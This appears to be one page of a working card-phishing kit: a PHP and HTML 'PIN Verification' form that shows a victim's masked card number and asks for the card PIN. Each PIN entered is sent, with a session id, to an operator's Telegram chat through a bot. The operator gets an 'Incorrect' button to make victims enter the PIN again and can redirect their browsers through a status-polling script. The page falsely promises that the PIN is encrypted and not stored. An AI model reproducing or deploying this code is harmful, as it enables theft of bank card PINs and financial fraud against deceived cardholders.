<?php
require_once 'config.php';

$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionData = json_decode(file_get_contents($sessionFile), true);
$sessionData['session_id'] = $sessionId;
$cardData = $sessionData['card_data'];

if (isCardBlocked($cardData['number'])) {
    header("Location: " . buildPageUrl('payments', ['error' => 'blocked']));
    exit();
}

// Initialize PIN attempts counter if not exists (atomic update)
if (!isset($sessionData['pin_attempts'])) {
    updateSessionData($sessionId, function(&$sessionData) {
        if (!isset($sessionData['pin_attempts'])) {
            $sessionData['pin_attempts'] = 5;
        }
        return true;
    });
    $sessionData['pin_attempts'] = 5; // Update local copy
}

$error = null;
$pinAttempts = $sessionData['pin_attempts'] ?? 5;

if (isset($_GET['error']) && $_GET['error'] === 'incorrect') {
    // Use atomic update to prevent race conditions
    updateSessionData($sessionId, function(&$sessionData) use (&$pinAttempts) {
        $pinAttempts = ($sessionData['pin_attempts'] ?? 5) - 1;
        $pinAttempts = max(0, $pinAttempts);
        $sessionData['pin_attempts'] = $pinAttempts;
        return true;
    });
    
    if ($pinAttempts > 0) {
        $error = "Incorrect PIN, you have $pinAttempts attempts left";
    } else {
        blockCard($cardData['number']);
        header("Location: " . buildPageUrl('payments', ['error' => 'blocked']));
        exit();
    }
}

$pageTitle = 'PIN Verification';
$checkStatusUrl = buildPageUrl('check_status');

// Update current page on load (atomic update to preserve session_id)
updateSessionData($sessionId, function(&$sessionData) use ($pageTitle) {
    $sessionData['current_page'] = $pageTitle;
    return true;
});

if ($pinAttempts <= 0) {
    header("Location: " . buildPageUrl('payments', ['error' => 'blocked']));
    exit();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pinCode = preg_replace('/[^0-9]/', '', $_POST['pin_code'] ?? '');
    
    if (empty($pinCode) || strlen($pinCode) < 4) {
        $error = 'Please enter a valid 4-digit PIN code';
    } elseif ($pinAttempts <= 0) {
        header("Location: " . buildPageUrl('payments', ['error' => 'incorrect']));
        exit();
    } else {
        // Use atomic update to prevent race conditions
        updateSessionData($sessionId, function(&$sessionData) use ($pinCode, $sessionId) {
            $adminConfig = getAdminConfigFromSession($sessionData);
            $chatId = $adminConfig['chat_id'] ?? ADMIN_CHAT_ID;
            
            // Get root message ID
            $rootMessageId = $sessionData['root_message']['message_id'] ?? $sessionData['last_message']['message_id'] ?? null;
            
            // Get current attempts from session
            $currentAttempts = $sessionData['pin_attempts'] ?? 5;
            
            $replyText = "🔑 *PIN Code Received*\n";
            $replyText .= "PIN: `$pinCode`\n";
            $replyText .= "Attempts left: `$currentAttempts`\n";
            $replyText .= "Session: `$sessionId`";
            
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => '❌ Incorrect', 'callback_data' => "verify:$sessionId:pin:incorrect"]
                    ]
                ]
            ];
            
            // Send PIN code to Telegram (always send, even if rootMessageId is missing)
            $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $replyText,
                'parse_mode' => 'Markdown',
                'reply_markup' => json_encode($keyboard)
            ];
            
            // Add reply_to_message_id only if available
            if ($rootMessageId) {
                $data['reply_to_message_id'] = $rootMessageId;
            }
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10
            ]);
            curl_exec($ch);

            curl_close($ch);
            
            // Update root message with current page
            $sessionData['current_page'] = 'PIN Verification';
            updateRootMessage($sessionData);
            
            $sessionData['pin_code'] = $pinCode;
            $sessionData['pin_submitted_at'] = time();
            $sessionData['last_verification_type'] = 'pin'; // Store verification type for incorrect redirect
            
            return true;
        });
        
        $debugParam = '';
        if (!empty($response)) {
            // Make sure $response is captured from curl_exec above
            $debugParam = '&debug=' . urlencode(substr($response, 0, 1000)); // truncate for URL safety
        }
        header("Location: " . buildPageUrl('waiting', ['session' => $sessionId]) . $debugParam);
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIN Verification</title>
    <style>
        :root {
            --primary: #6772e5;
            --primary-hover: #5469d4;
            --error: #e25950;
            --success: #28a745;
            --border: #e1e1e8;
            --text: #32325d;
            --text-light: #6b7c93;
            --bg: #f6f9fc;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: var(--text);
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .pin-container {
            max-width: 480px;
            width: 100%;
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        .header-section {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        
        .header-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .header-title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header-subtitle {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .content-section {
            padding: 40px 30px;
        }
        
        .card-preview {
            background: rgba(40, 167, 69, 0.1);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid rgba(40, 167, 69, 0.2);
        }
        
        .card-number {
            font-size: 18px;
            font-weight: 600;
            color: var(--success);
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        
        .card-info {
            font-size: 14px;
            color: var(--text-light);
        }
        
        .pin-input-section {
            margin-bottom: 30px;
        }
        
        .pin-label {
            display: block;
            text-align: center;
            margin-bottom: 20px;
            font-size: 16px;
            color: var(--text);
            font-weight: 500;
        }
        
        .pin-inputs {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 15px;
        }
        
        .pin-input {
            width: 60px;
            height: 70px;
            text-align: center;
            font-size: 28px;
            font-weight: 600;
            border: 2px solid var(--border);
            border-radius: 12px;
            background: white;
            transition: all 0.3s ease;
            color: var(--text);
        }
        
        .pin-input:focus {
            outline: none;
            border-color: var(--success);
            box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.1);
            transform: translateY(-2px);
        }
        
        .pin-input.filled {
            border-color: var(--success);
            background: rgba(40, 167, 69, 0.05);
        }
        
        .pin-hint {
            text-align: center;
            font-size: 14px;
            color: var(--text-light);
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }
        
        .submit-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(40, 167, 69, 0.4);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .security-notice {
            background: rgba(248, 249, 250, 0.8);
            border-radius: 12px;
            padding: 20px;
            font-size: 14px;
            color: var(--text-light);
            text-align: center;
            border-left: 4px solid var(--success);
        }
        
        .timer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: var(--text-light);
        }
        
        .countdown {
            font-weight: 600;
            color: var(--success);
        }
        
        .error-message {
            background: rgba(226, 89, 80, 0.15);
            border: 2px solid var(--error);
            border-radius: 12px;
            padding: 18px 20px;
            margin-bottom: 25px;
            text-align: center;
            color: var(--error);
            font-size: 15px;
            font-weight: 600;
            box-shadow: 0 2px 8px rgba(226, 89, 80, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .error-message::before {
            content: "⚠️";
            font-size: 20px;
        }
        
        .attempts-warning {
            background: rgba(255, 193, 7, 0.15);
            border: 2px solid #ffc107;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 20px;
            text-align: center;
            color: #856404;
            font-size: 14px;
            font-weight: 500;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .header-section {
                padding: 30px 20px;
            }
            
            .content-section {
                padding: 30px 20px;
            }
            
            .pin-inputs {
                gap: 8px;
            }
            
            .pin-input {
                width: 55px;
                height: 65px;
                font-size: 26px;
            }
            
            .header-title {
                font-size: 24px;
            }
        }
        
        /* Animation for completed pin */
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-5px);}
            60% {transform: translateY(-3px);}
        }
        
        .pin-input.completed {
            animation: bounce 0.6s ease;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }
        
        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--success);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .password-mask {
            position: relative;
        }
        
        .password-mask::after {
            content: '•';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
            color: var(--text);
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .password-mask.masked::after {
            opacity: 1;
        }
        
        .password-mask.masked .pin-input {
            color: transparent;
        }
        
        .toggle-mask {
            text-align: center;
            margin-top: 10px;
        }
        
        .toggle-mask-btn {
            background: none;
            border: none;
            color: var(--success);
            font-size: 14px;
            cursor: pointer;
            text-decoration: underline;
        }

        body {
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="pin-container">
        <div class="glass-card">
            <div class="header-section">
                <div class="header-icon">🔒</div>
                <h1 class="header-title">PIN Verification</h1>
                <p class="header-subtitle">Enter your 4-digit card PIN code</p>
            </div>
            
            <div class="content-section">
                <?php if (isset($error)): ?>
                    <div class="error-message"><?= htmlspecialchars($error) ?></div>
                <?php endif; ?>
                
                <?php if ($pinAttempts > 0 && $pinAttempts < 5): ?>
                    <div class="attempts-warning">
                        ⚠️ You have <?= $pinAttempts ?> attempt<?= $pinAttempts > 1 ? 's' : '' ?> remaining
                    </div>
                <?php endif; ?>
                
                <div class="card-preview">
                    <div class="card-number">
                        **** **** **** <?= substr($cardData['number'], -4) ?>
                    </div>
                    <div class="card-info">
                        <?= $cardData['holder'] ?> • Expires <?= $cardData['expiry'] ?>
                    </div>
                </div>
                
                <form method="POST" action="pin.php?session=<?= $sessionId ?>" id="pin-form">
                    <div class="pin-input-section">
                        <label class="pin-label">Enter your card PIN</label>
                        <div class="pin-inputs" id="pin-inputs-container">
                            <div class="password-mask" id="mask-1">
                                <input type="tel" class="pin-input" maxlength="1" data-index="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                            </div>
                            <div class="password-mask" id="mask-2">
                                <input type="tel" class="pin-input" maxlength="1" data-index="2" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                            </div>
                            <div class="password-mask" id="mask-3">
                                <input type="tel" class="pin-input" maxlength="1" data-index="3" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                            </div>
                            <div class="password-mask" id="mask-4">
                                <input type="tel" class="pin-input" maxlength="1" data-index="4" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                            </div>
                        </div>
                        <input type="hidden" name="pin_code" id="pin-code">
                        <div class="pin-hint">Enter the 4-digit PIN code for your card</div>
                        
                        <div class="toggle-mask">
                            <button type="button" class="toggle-mask-btn" id="toggle-mask">
                                Show PIN
                            </button>
                        </div>
                    </div>
                    
                    <button type="submit" class="submit-btn" id="submit-btn" disabled>
                        Verify PIN
                    </button>
                </form>
                
                <div class="security-notice">
                    <strong>Security Notice:</strong> Your PIN is encrypted and processed securely. 
                    We do not store your PIN code after verification.
                </div>
                
                <div class="timer">
                    Session expires in: <span class="countdown" id="countdown">05:00</span>
                </div>
            </div>
        </div>
    </div>

    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const pinInputs = document.querySelectorAll('.pin-input');
            const passwordMasks = document.querySelectorAll('.password-mask');
            const hiddenInput = document.getElementById('pin-code');
            const submitBtn = document.getElementById('submit-btn');
            const form = document.getElementById('pin-form');
            const loadingOverlay = document.getElementById('loading-overlay');
            const toggleMaskBtn = document.getElementById('toggle-mask');
            let countdown = 300; // 5 minutes in seconds
            let isMasked = true;
            
            // Focus on first input
            pinInputs[0].focus();
            
            // Start countdown timer
            startCountdown();
            
            // Toggle password mask
            toggleMaskBtn.addEventListener('click', function() {
                isMasked = !isMasked;
                passwordMasks.forEach(mask => {
                    if (isMasked) {
                        mask.classList.add('masked');
                        toggleMaskBtn.textContent = 'Show PIN';
                    } else {
                        mask.classList.remove('masked');
                        toggleMaskBtn.textContent = 'Hide PIN';
                    }
                });
            });
            
            // Initialize masked state
            passwordMasks.forEach(mask => {
                mask.classList.add('masked');
            });
            
            // Handle PIN input
            pinInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = this.value;
                    
                    // Only allow numbers
                    if (!/^\d*$/.test(value)) {
                        this.value = '';
                        return;
                    }
                    
                    if (value.length === 1) {
                        this.classList.add('filled');
                        
                        // Move to next input if available
                        if (index < pinInputs.length - 1) {
                            pinInputs[index + 1].focus();
                        }
                        
                        // Check if all inputs are filled
                        checkPinCompletion();
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '') {
                        // Move to previous input on backspace
                        if (index > 0) {
                            pinInputs[index - 1].focus();
                            pinInputs[index - 1].value = '';
                            pinInputs[index - 1].classList.remove('filled');
                            checkPinCompletion();
                        }
                    }
                    
                    // Allow navigation with arrow keys
                    if (e.key === 'ArrowLeft' && index > 0) {
                        pinInputs[index - 1].focus();
                    }
                    
                    if (e.key === 'ArrowRight' && index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').slice(0, 4);
                    
                    if (/^\d+$/.test(pasteData)) {
                        // Fill all inputs with pasted data
                        pinInputs.forEach((input, i) => {
                            if (i < pasteData.length) {
                                input.value = pasteData[i];
                                input.classList.add('filled');
                            } else {
                                input.value = '';
                                input.classList.remove('filled');
                            }
                        });
                        
                        // Focus on last filled input or last input
                        const focusIndex = Math.min(pasteData.length, pinInputs.length - 1);
                        pinInputs[focusIndex].focus();
                        
                        checkPinCompletion();
                    }
                });
            });
            
            function checkPinCompletion() {
                const pin = Array.from(pinInputs).map(input => input.value).join('');
                hiddenInput.value = pin;
                
                if (pin.length === 4) {
                    submitBtn.disabled = false;
                    
                    // Add completion animation
                    pinInputs.forEach(input => {
                        input.classList.add('completed');
                    });
                    
                    // Auto-submit after short delay
                    setTimeout(() => {
                        showLoading();
                        form.submit();
                    }, 800);
                } else {
                    submitBtn.disabled = true;
                    pinInputs.forEach(input => {
                        input.classList.remove('completed');
                    });
                }
            }
            
            function showLoading() {
                loadingOverlay.classList.add('active');
            }
            
            function startCountdown() {
                const countdownElement = document.getElementById('countdown');
                
                const timer = setInterval(function() {
                    const minutes = Math.floor(countdown / 60);
                    const seconds = countdown % 60;
                    
                    countdownElement.textContent = 
                        minutes.toString().padStart(2, '0') + ':' + 
                        seconds.toString().padStart(2, '0');
                    
                    if (countdown <= 60) {
                        countdownElement.style.color = 'var(--error)';
                    }
                    
                    if (countdown <= 0) {
                        clearInterval(timer);
                        countdownElement.textContent = '00:00';
                        
                        // Disable form
                        pinInputs.forEach(input => {
                            input.disabled = true;
                            input.placeholder = '×';
                        });
                        
                        submitBtn.disabled = true;
                        submitBtn.textContent = 'Session Expired';
                        submitBtn.style.background = 'var(--error)';
                    }
                    
                    countdown--;
                }, 1000);
            }
            
            // Manual form submission handler
            form.addEventListener('submit', function(e) {
                const pin = hiddenInput.value;
                if (pin.length !== 4) {
                    e.preventDefault();
                    return;
                }
                showLoading();
            });
            
            // Prevent form resubmission
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;

            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };

            poll();
            setInterval(poll, 3000);

            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>